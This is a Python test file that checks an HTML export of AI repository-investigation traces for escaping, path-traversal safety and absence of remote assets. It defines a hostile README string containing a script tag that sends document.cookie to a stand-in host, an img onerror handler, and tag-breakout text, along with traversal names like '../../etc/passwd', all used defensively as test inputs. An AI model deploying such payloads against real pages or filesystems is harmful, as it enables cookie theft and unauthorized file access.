"""Tests for the static trace export.

The threat these are mostly about: every string on these pages came from a
README, a command's stdout, a repository description or a web result, and the
repositories are chosen from public feeds. The markdown report already treats
that text as hostile; HTML raises the stakes, because unescaped text in a
browser is script rather than a broken table cell.

So the escaping tests are written adversarially and assert on what a *parser*
sees, not on what a substring search finds. `&lt;img src=...` appears in plenty
of these pages as the literal text of a README badge, and a test that greps for
`src=` would fail on that while a page carrying a real injected tag could pass.

Everything is offline: a temporary database, a temporary question set, no
network, no Docker, no API.
"""

import json
from html.parser import HTMLParser
from pathlib import Path

import pytest
import yaml

import export_traces as ex
from ai_monitor.storage import db

# A README that is trying to get out of its cell, in several ways at once.
HOSTILE = (
    '<script>fetch("https://evil.example/"+document.cookie)</script>'
    '<img src=x onerror="alert(1)">'
    "\"'`</div></td><style>body{display:none}</style>"
)


class Parsed(HTMLParser):
    """What the browser actually sees, as opposed to what the bytes contain."""

    def __init__(self) -> None:
        super().__init__()
        self.tags: set = set()
        self.links: list = []
        self.remote: list = []
        self.text: list = []

    def handle_starttag(self, tag, attrs):
        self.tags.add(tag)
        for key, value in attrs:
            if key not in {"src", "href"} or not value:
                continue
            if value.endswith(".html"):
                self.links.append(value)
            else:
                self.remote.append((tag, key, value))

    def handle_data(self, data):
        self.text.append(data)


def parse(path: Path) -> Parsed:
    out = Parsed()
    out.feed(path.read_text(encoding="utf-8"))
    return out


def store(conn, repo="owner/name", question="Does owner/name X?", verdict="supported",
          ledger=(), tool_calls=(), statement="it printed the thing",
          critique_status="ok", critique=None, summary="A summary."):
    report = {
        "question": question,
        "verdict": verdict,
        "blockers": [],
        "ledger": [
            {"statement": statement, "side": side, "kind": kind, "source": source}
            for side, kind, source in (ledger or [("for", "observed", "sandbox_run(x)")])
        ],
        "facts": {
            "setup_seconds": 12.5, "setup_commands": 1, "install_succeeded": True,
            "clone_mb": 40.0, "volume_mb": 90.0, "needs": [],
            "headline_capability": "it does the thing", "observed_output": "ok",
        },
        "summary": summary,
    }
    conn.execute(
        """
        INSERT INTO investigations
            (repo, question, verdict, blockers, report, tool_calls, stop_reason,
             downgraded, critique, critique_status, revised, cost_usd,
             wall_seconds, steps_taken)
        VALUES (?, ?, ?, ?, ?, ?, 'sufficient_info', 0, ?, ?, 0, 0.25, 40.0, 6)
        """,
        (
            repo, question, verdict, "[]", json.dumps(report),
            json.dumps(list(tool_calls) or [call("sandbox_run")]),
            json.dumps(critique or {"grounded": True, "issues": []}),
            critique_status,
        ),
    )
    conn.commit()


def call(tool, step=1, is_error=False, summary='{"exit_code": 0, "stdout": "ok"}',
         arguments=None):
    return {
        "step": step,
        "tool": tool,
        "arguments": arguments or {"command": "pytest -q"},
        "is_error": is_error,
        "result_summary": summary,
    }


def questions_file(tmp_path, repo="owner/name", question="Does owner/name X?",
                   execution="required", verdict=("supported",)):
    path = tmp_path / "q.yaml"
    path.write_text(yaml.safe_dump({
        "questions": [{
            "repo": repo, "question": question, "category": "execution",
            "expect": {"verdict": list(verdict), "execution": execution},
        }]
    }))
    return path


@pytest.fixture
def conn(tmp_path):
    connection = db.connect(tmp_path / "t.db")
    yield connection
    connection.close()


# --- the export runs offline ---------------------------------------------


def test_export_writes_an_index_and_a_page_per_investigation(conn, tmp_path):
    store(conn)
    written = ex.export(conn, tmp_path / "site", questions_file(tmp_path))

    names = {p.name for p in written}
    assert names == {"index.html", "owner-name.html"}
    assert all(p.exists() and p.stat().st_size > 0 for p in written)


def test_a_question_with_no_stored_run_still_gets_a_page(conn, tmp_path):
    """An empty page is honest; a missing one is a broken link from the index."""
    out = tmp_path / "site"
    ex.export(conn, out, questions_file(tmp_path, repo="never/run",
                                        question="Does never/run X?"))

    page = out / "never-run.html"
    assert page.exists()
    assert "No tools were called" in page.read_text()


# --- hostile content is escaped ------------------------------------------


def test_a_script_tag_in_a_ledger_statement_is_escaped(conn, tmp_path):
    """The whole point. A README that reaches a browser unescaped is code."""
    store(conn, statement=HOSTILE)
    out = tmp_path / "site"
    ex.export(conn, out, questions_file(tmp_path))

    page = out / "owner-name.html"
    parsed = parse(page)

    # The browser sees no script and no image, whatever the bytes say.
    assert "script" not in parsed.tags
    assert "img" not in parsed.tags
    # And the hostile text is present as *text*, not dropped - a page that
    # silently swallowed it would hide evidence rather than render it safely.
    assert "<script>" in "".join(parsed.text)


def test_hostile_content_in_a_tool_result_is_escaped(conn, tmp_path):
    """Command stdout is attacker-controlled too, not just the README."""
    store(conn, tool_calls=[call("sandbox_run", summary=HOSTILE)])
    out = tmp_path / "site"
    ex.export(conn, out, questions_file(tmp_path))

    parsed = parse(out / "owner-name.html")
    assert "script" not in parsed.tags and "style" in parsed.tags  # only our own
    assert parsed.remote == []


def test_hostile_content_in_tool_arguments_is_escaped(conn, tmp_path):
    store(conn, tool_calls=[call("sandbox_run", arguments={"command": HOSTILE})])
    parsed = parse(_one_page(conn, tmp_path))
    assert "script" not in parsed.tags


def test_a_hostile_question_cannot_break_the_index(conn, tmp_path):
    question = f"Does owner/name {HOSTILE}?"
    store(conn, question=question)
    out = tmp_path / "site"
    ex.export(conn, out, questions_file(tmp_path, question=question))

    parsed = parse(out / "index.html")
    assert "script" not in parsed.tags
    assert parsed.remote == []


def test_a_hostile_critique_issue_is_escaped(conn, tmp_path):
    store(conn, critique={"grounded": False, "issues": [HOSTILE]})
    parsed = parse(_one_page(conn, tmp_path))
    assert "script" not in parsed.tags


def test_escaping_covers_quotes_so_an_attribute_cannot_be_broken_out_of():
    """`safe` is used inside href="..." as well as in text."""
    assert ex.safe('" onmouseover="alert(1)') == "&quot; onmouseover=&quot;alert(1)"
    assert "<" not in ex.safe("<b>") and "&lt;b&gt;" == ex.safe("<b>")


def test_control_characters_are_stripped_before_escaping():
    assert "\x00" not in ex.safe("a\x00b")
    assert ex.safe("a\x1bb") == "ab"


def test_long_text_is_truncated_on_visible_characters():
    """Truncating after escaping could cut an entity in half."""
    out = ex.safe("<" * 100, limit=10)
    assert out.startswith("&lt;") and out.endswith("...")
    assert "&l;" not in out and "&" not in out.replace("&lt;", "")


# --- the filename cannot escape the directory ----------------------------


@pytest.mark.parametrize(
    "repo", ["../../etc/passwd", "owner/../../x", "..", "/abs/path", "a/b~c"]
)
def test_a_hostile_repo_name_cannot_escape_the_output_directory(repo):
    out = ex.slug(repo)
    assert "/" not in out and ".." not in out and not out.startswith("-")


def test_slug_never_returns_an_empty_filename():
    assert ex.slug("///") == "investigation"
    assert ex.slug("") == "investigation"


# --- no external assets, no javascript -----------------------------------


def test_pages_load_nothing_from_the_network(conn, tmp_path):
    """A page that fetches nothing renders the same from file:// and from Pages,
    and cannot report a reader's visit to anyone."""
    store(conn, tool_calls=[call("read_file", summary='"<img src=https://x/y.png>"')])
    out = tmp_path / "site"
    ex.export(conn, out, questions_file(tmp_path))

    for page in out.glob("*.html"):
        parsed = parse(page)
        assert parsed.remote == [], f"{page.name} references {parsed.remote}"
        assert "script" not in parsed.tags


def test_only_an_allowlist_of_tags_is_ever_emitted(conn, tmp_path):
    allowed = {
        "html", "head", "meta", "title", "style", "body", "div", "h1", "h2",
        "p", "a", "span", "table", "tr", "th", "td", "dl", "dt", "dd", "ul",
        "li", "br", "pre", "code",
    }
    store(conn, statement=HOSTILE)
    out = tmp_path / "site"
    ex.export(conn, out, questions_file(tmp_path))

    for page in out.glob("*.html"):
        assert parse(page).tags <= allowed, page.name


# --- the index and the pages agree ---------------------------------------


def test_the_index_links_to_every_page_and_nothing_is_orphaned(conn, tmp_path):
    store(conn, repo="a/one", question="Does a/one X?")
    store(conn, repo="b/two", question="Does b/two X?")
    path = tmp_path / "q.yaml"
    path.write_text(yaml.safe_dump({"questions": [
        {"repo": "a/one", "question": "Does a/one X?", "category": "reading",
         "expect": {"verdict": ["supported"], "execution": "required"}},
        {"repo": "b/two", "question": "Does b/two X?", "category": "reading",
         "expect": {"verdict": ["supported"], "execution": "required"}},
    ]}))
    out = tmp_path / "site"
    ex.export(conn, out, path)

    linked = set(parse(out / "index.html").links)
    on_disk = {p.name for p in out.glob("*.html")} - {"index.html"}

    assert linked == on_disk, "every page is linked and every link resolves"
    for name in linked:
        assert (out / name).exists()


def test_every_page_links_back_to_the_index(conn, tmp_path):
    store(conn)
    out = tmp_path / "site"
    ex.export(conn, out, questions_file(tmp_path))
    assert "index.html" in parse(out / "owner-name.html").links


# --- the trace is complete -----------------------------------------------


def test_every_tool_call_appears_including_the_failed_ones(conn, tmp_path):
    """A trace that hides its dead ends is not a trace."""
    calls = [
        call("get_repo_metadata", step=1),
        call("sandbox_clone", step=2),
        call("sandbox_run", step=3, is_error=True,
             summary='{"exit_code": 127, "stderr": "command not found"}'),
        call("sandbox_run", step=4),
    ]
    store(conn, tool_calls=calls)
    out = tmp_path / "site"
    ex.export(conn, out, questions_file(tmp_path))

    html_text = (out / "owner-name.html").read_text()
    assert html_text.count('class="step') == len(calls)
    assert "command not found" in html_text
    assert "err-flag" in html_text  # the failure is marked, not quietly dropped


def test_each_evidence_kind_is_visually_distinguished(conn, tmp_path):
    store(
        conn,
        ledger=[("for", "observed", "sandbox_run(x)"),
                ("for", "inspected", "get_repo_metadata(a/b)"),
                ("for", "reported", "read_file(README.md)")],
        tool_calls=[call("sandbox_run"), call("get_repo_metadata"), call("read_file")],
    )
    out = tmp_path / "site"
    ex.export(conn, out, questions_file(tmp_path))

    text = (out / "owner-name.html").read_text()
    for kind in ("observed", "inspected", "reported"):
        assert f'class="tag {kind}"' in text


def test_a_failing_question_shows_which_criterion_failed(conn, tmp_path):
    store(conn, verdict="refuted")
    out = tmp_path / "site"
    ex.export(conn, out, questions_file(tmp_path, verdict=("supported",)))

    assert "verdict" in (out / "index.html").read_text()
    assert "fails" in (out / "owner-name.html").read_text()


def _one_page(conn, tmp_path) -> Path:
    out = tmp_path / "site"
    ex.export(conn, out, questions_file(tmp_path))
    return out / "owner-name.html"
